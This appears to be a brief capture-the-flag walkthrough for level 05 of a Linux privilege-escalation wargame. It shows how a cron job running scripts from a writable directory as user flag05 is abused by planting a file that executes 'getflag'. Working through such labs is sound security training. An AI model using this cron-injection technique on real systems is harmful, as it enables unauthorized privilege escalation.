Ran `find / -user flag05` and found openarenaserver files
`/usr/sbin/openarenaserver`
Looks like the same sort of string exploitation as the last level
I have mail for some reason?
`less /var/spool/mail/level05`
`*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05`
Cron job?
`*/2` means it runs every 2 minutes
`/usr/sbin/openarenaserver` script being run with flag05's permissions
`bash -x "$1"` is running the contents of the file as a bash script
`echo 'getflag > /tmp/flag' > /opt/openarenaserver/file`
This is run with flag05's permissions producing the `/tmp/flag` file containing the output of `getflag`
